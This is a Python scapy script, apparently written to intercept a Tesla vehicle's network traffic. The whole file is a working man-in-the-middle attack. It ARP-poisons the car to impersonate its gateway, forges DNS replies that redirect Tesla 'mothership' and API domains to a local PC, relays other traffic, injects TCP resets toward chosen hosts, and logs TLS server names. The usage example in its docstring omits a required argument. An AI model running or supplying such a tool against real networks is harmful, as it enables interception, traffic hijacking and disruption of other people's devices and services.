#!/usr/bin/env python
r"""
arp_mitm.py - Route vehicle traffic through the local PC in user space

Operation:
  1. Send the vehicle an ARP reply once per second advertising this PC's MAC for 192.168.199.1.
     The PC then receives outbound traffic from the vehicle, including DNS queries.
  2. For UDP/53, answer matching DNS queries locally with --answer and relay other queries upstream.
  3. Forward other traffic at layer 2 by setting the destination MAC to the actual gateway MAC.
     This keeps normal vehicle connectivity available without enabling Windows IP forwarding.
     The gateway's ARP state is unchanged, so it sends replies directly to the vehicle.
  4. Restore the actual gateway MAC in the vehicle's ARP cache on exit.

Usage:
    python tools\arp_mitm.py --target 192.168.199.95 --gateway 192.168.199.1 \
        --answer 192.168.199.148 --iface Wi-Fi --duration 7200

Logs: C:\fsd-mitm\logs\arp_mitm.log. Matching DNS queries also use the dns_sink schema in logs\dns.jsonl.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import socket
import sys
import threading
import time

from scapy.all import (  # type: ignore
    ARP, DNS, DNSRR, IP, TCP, UDP, Ether, Raw, conf, getmacbyip, sendp, sniff,
)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_PATH = os.path.join(ROOT, "logs", "arp_mitm.log")
DNS_JSONL = os.path.join(ROOT, "logs", "dns.jsonl")
REDIRECT = {"mothership.vn.teslamotors.com", "mothership.vn.cloud.tesla.cn", "api-prd.vn.cloud.tesla.cn"}
REDIRECT_PREFIX = ("mothership.",)   # Resolve all mothership.* domains to the local PC.
UPSTREAM = "223.5.5.5"

LOG_LOCK = threading.Lock()
stats = {"poison": 0, "dns": 0, "redirect": 0, "forward_dns": 0, "fwd_l2": 0, "skipped": 0, "error": 0, "rst": 0}
FLOWS: dict[str, int] = {}
SEEN: set[str] = set()


def log(msg: str) -> None:
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}"
    print(line, flush=True)
    with LOG_LOCK:
        try:
            with open(LOG_PATH, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        except OSError:
            pass


def log_dns(q: str, qtype: int, action: str, ip: str, peer: str) -> None:
    rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"), "q": q, "type": qtype,
           "action": action, "ip": ip, "peer": peer, "via": "arp_mitm"}
    with LOG_LOCK:
        try:
            with open(DNS_JSONL, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
        except OSError:
            pass


def tls_sni(payload: bytes) -> str | None:
    """Extract the SNI from a TLS ClientHello in the TCP payload without decrypting it."""
    try:
        if len(payload) < 6 or payload[0] != 0x16:
            return None
        rec_len = int.from_bytes(payload[3:5], "big")
        hs = payload[5:5 + rec_len]
        if len(hs) < 5 or hs[0] != 0x01:
            return None
        body = hs[4:]
        i = 0
        i += 2 + 32                      # client_version + random
        sid_len = body[i]; i += 1 + sid_len
        cs_len = int.from_bytes(body[i:i + 2], "big"); i += 2 + cs_len
        comp_len = body[i]; i += 1 + comp_len
        ext_total = int.from_bytes(body[i:i + 2], "big"); i += 2
        end = min(len(body), i + ext_total)
        while i + 4 <= end:
            etype = int.from_bytes(body[i:i + 2], "big")
            elen = int.from_bytes(body[i + 2:i + 4], "big")
            i += 4
            if etype == 0:               # server_name
                if i + 3 > len(body):
                    return None
                nlen = int.from_bytes(body[i + 3:i + 5], "big")
                return body[i + 5:i + 5 + nlen].decode("latin1").lower()
            i += elen
    except Exception:  # noqa: BLE001
        return None
    return None

def resolve_mac(ip: str, tries: int = 12) -> str | None:
    """Resolve the MAC by warming the ARP cache, polling getmacbyip, and falling back to arp -a."""
    for _ in range(tries):
        mac = getmacbyip(ip)
        if mac:
            return mac.lower()
        try:
            subprocess.run(["ping", "-n", "1", "-w", "800", ip],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           creationflags=0x08000000)
        except Exception:  # noqa: BLE001
            pass
        try:
            out = subprocess.run(["arp", "-a", ip], capture_output=True, text=True,
                                  creationflags=0x08000000).stdout
            m = re.search(r"([0-9a-f]{2}(?:-[0-9a-f]{2}){5})", out, re.I)
            if m:
                return m.group(1).replace("-", ":").lower()
        except Exception:  # noqa: BLE001
            pass
        time.sleep(1)
    return None


class Mitm:
    def __init__(self, iface: str, target_ip: str, target_mac: str, gw_ip: str,
                 gw_mac: str, our_mac: str, our_ip: str, answer_ip: str,
                 upstream: str, forward_l2: bool, extra_local: set[str] | None = None, rst_dst: set[str] | None = None):
        self.iface = iface
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.our_mac = our_mac
        self.our_ip = our_ip
        self.answer_ip = answer_ip
        self.upstream = upstream
        self.forward_l2 = forward_l2
        self.extra_local = extra_local or set()
        self.rst_dst = rst_dst or set()
        self.stop = threading.Event()

    # ---------- ARP ----------
    def poison_loop(self) -> None:
        frame = (Ether(src=self.our_mac, dst=self.target_mac) /
                 ARP(op=2, psrc=self.gw_ip, pdst=self.target_ip,
                     hwsrc=self.our_mac, hwdst=self.target_mac))
        while not self.stop.is_set():
            try:
                sendp(frame, iface=self.iface, verbose=False)
                stats["poison"] += 1
            except Exception as exc:  # noqa: BLE001
                stats["error"] += 1
                log(f"poison error: {type(exc).__name__}: {exc}")
            self.stop.wait(1.0)

    def restore(self) -> None:
        frame = (Ether(src=self.gw_mac, dst=self.target_mac) /
                 ARP(op=2, psrc=self.gw_ip, pdst=self.target_ip,
                     hwsrc=self.gw_mac, hwdst=self.target_mac))
        for _ in range(3):
            try:
                sendp(frame, iface=self.iface, verbose=False)
            except Exception:  # noqa: BLE001
                pass
            time.sleep(0.3)
        log(f"restore: restored the vehicle's ARP entry for {self.gw_ip} to {self.gw_mac}")

    # ---------- Sending ----------
    def _send_l3(self, pkt, payload: bytes, src_ip: str) -> None:
        sendp(Ether(src=self.our_mac, dst=self.target_mac) /
              IP(src=src_ip, dst=self.target_ip) /
              UDP(sport=53, dport=pkt[UDP].sport) / Raw(load=payload),
              iface=self.iface, verbose=False)

    # ---------- DNS ----------
    def _answer_a(self, pkt, qname: str) -> None:
        qd = pkt[DNS].qd
        dns = DNS(id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1, qd=qd,
                  an=DNSRR(rrname=qd.qname, type="A", ttl=60, rdata=self.answer_ip))
        self._send_l3(pkt, bytes(dns), pkt[IP].dst)
        stats["redirect"] += 1
        log(f"REDIRECT {qname} -> {self.answer_ip} (client {pkt[IP].src})")
        log_dns(qname, 1, "REDIRECT", self.answer_ip, pkt[IP].src)

    def _answer_empty(self, pkt, qname: str, qtype: int) -> None:
        dns = DNS(id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1, qd=pkt[DNS].qd, ancount=0)
        self._send_l3(pkt, bytes(dns), pkt[IP].dst)
        log_dns(qname, qtype, "REDIRECT-EMPTY", self.answer_ip, pkt[IP].src)

    def _forward_dns(self, pkt, qname: str, qtype: int) -> None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2.0)
            s.sendto(bytes(pkt[UDP].payload), (self.upstream, 53))
            reply, _ = s.recvfrom(4096)
            s.close()
            self._send_l3(pkt, reply, pkt[IP].dst)
            stats["forward_dns"] += 1
            log_dns(qname, qtype, "FORWARD", "", pkt[IP].src)
        except OSError as exc:
            stats["error"] += 1
            log(f"forward dns fail {qname}: {exc}")

    # ---------- Layer 2 forwarding ----------
    def _forward_l2(self, pkt) -> None:
        try:
            fwd = pkt.copy()
            fwd[Ether].src = self.our_mac
            fwd[Ether].dst = self.gw_mac
            sendp(fwd, iface=self.iface, verbose=False)
            stats["fwd_l2"] += 1
        except Exception as exc:  # noqa: BLE001
            stats["error"] += 1
            log(f"l2 forward error: {type(exc).__name__}: {exc}")

    # ---------- Packet handling ----------
    def handle(self, pkt) -> None:
        try:
            if IP not in pkt:
                return
            ip = pkt[IP]
            if ip.src != self.target_ip:
                return
            if ip.dst == self.our_ip or ip.dst in self.extra_local:
                stats["skipped"] += 1          # The kernel handles traffic destined for the PC, such as port 4567.
                if TCP in pkt and (int(pkt[TCP].flags) & 0x02):   # SYN
                    key = f"oursyn:{pkt[TCP].dport}"
                    if key not in SEEN:
                        SEEN.add(key)
                        log(f"car -> us  SYN dport={pkt[TCP].dport} sport={pkt[TCP].sport}")
                return
            if UDP in pkt and pkt[UDP].dport == 53 and DNS in pkt:
                if pkt[DNS].qr != 0 or pkt[DNS].qd is None:
                    return
                qname = pkt[DNS].qd.qname.decode("latin1").rstrip(".").lower()
                qtype = int(pkt[DNS].qd.qtype)
                stats["dns"] += 1
                if qname in REDIRECT or qname.startswith(REDIRECT_PREFIX):
                    if qtype == 1:
                        self._answer_a(pkt, qname)
                    else:
                        self._answer_empty(pkt, qname, qtype)
                else:
                    self._forward_dns(pkt, qname, qtype)
                return
            if ip.dst in self.rst_dst:
                if TCP in pkt and (int(pkt[TCP].flags) & 0x10):   # ACK
                    t = pkt[TCP]
                    try:
                        sendp(Ether(src=self.our_mac, dst=self.target_mac) /
                              IP(src=ip.dst, dst=ip.src) /
                              TCP(sport=t.dport, dport=t.sport, flags="R", seq=t.ack),
                              iface=self.iface, verbose=False)
                        stats["rst"] += 1
                    except Exception:  # noqa: BLE001
                        pass
                return
            if TCP in pkt:
                key = f"{ip.dst}:{pkt[TCP].dport}"
                FLOWS[key] = FLOWS.get(key, 0) + 1
                raw = bytes(pkt[TCP].payload)
                if raw and raw[0] == 0x16 and len(raw) > 40:
                    sni = tls_sni(raw)
                    if sni and sni not in SEEN:
                        SEEN.add(sni)
                        log(f"TLS ClientHello SNI={sni} -> {ip.dst}:{pkt[TCP].dport}")
                        if sni.startswith("mothership."):
                            log(f"*** Matched {sni}. A connection to local port 4567 is expected. ***")
            if self.forward_l2:
                self._forward_l2(pkt)
        except Exception as exc:  # noqa: BLE001
            stats["error"] += 1
            log(f"handle error: {type(exc).__name__}: {exc}")

    def run(self, duration: int) -> None:
        threading.Thread(target=self.poison_loop, daemon=True).start()
        log(f"poison: {self.target_ip} sees {self.gw_ip} at {self.our_mac} "
            f"(actual gateway {self.gw_mac}) | answer={self.answer_ip} | forward_l2={self.forward_l2}")
        flt = f"ether src {self.target_mac}"
        end = time.time() + duration if duration > 0 else None
        last_report = time.time()
        try:
            while end is None or time.time() < end:
                sniff(iface=self.iface, filter=flt, prn=self.handle, store=False, timeout=15)
                if time.time() - last_report > 60:
                    last_report = time.time()
                    top = sorted(FLOWS.items(), key=lambda kv: -kv[1])[:6]
                    log(f"stats {stats} | top flows: {top}")
        except KeyboardInterrupt:
            pass
        finally:
            self.stop.set()
            self.restore()
            log(f"exit stats {stats}")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", default="Wi-Fi")
    ap.add_argument("--target", required=True)
    ap.add_argument("--gateway", required=True)
    ap.add_argument("--our-ip", required=True)
    ap.add_argument("--answer", required=True)
    ap.add_argument("--duration", type=int, default=0)
    ap.add_argument("--no-forward", action="store_true")
    ap.add_argument("--extra-local", default="", help="Comma-separated local destination IPs to exclude from forwarding")
    ap.add_argument("--rst-dst", default="", help="Comma-separated destination IPs for which to send an RST and drop the packet")
    ap.add_argument("--no-api", action="store_true", help="Keep normal vehicle API routing for api-prd")
    args = ap.parse_args()

    if args.no_api:
        REDIRECT.discard("api-prd.vn.cloud.tesla.cn")
        log("--no-api: skipping redirection for api-prd.vn.cloud.tesla.cn")
    iface = conf.ifaces.dev_from_name(args.iface).name
    our_mac = conf.ifaces.dev_from_name(args.iface).mac
    target_mac = resolve_mac(args.target)
    gw_mac = resolve_mac(args.gateway)
    if not target_mac or not gw_mac:
        log(f"MAC resolution failed: target={target_mac} gateway={gw_mac}")
        return 2
    log(f"iface={iface} our={our_mac} target={args.target}/{target_mac} gateway={args.gateway}/{gw_mac}")
    Mitm(iface, args.target, target_mac, args.gateway, gw_mac, our_mac,
         args.our_ip, args.answer, UPSTREAM, not args.no_forward,
         {x.strip() for x in args.extra_local.split(',') if x.strip()},
         {x.strip() for x in args.rst_dst.split(',') if x.strip()}).run(args.duration)
    return 0


if __name__ == "__main__":
    sys.exit(main())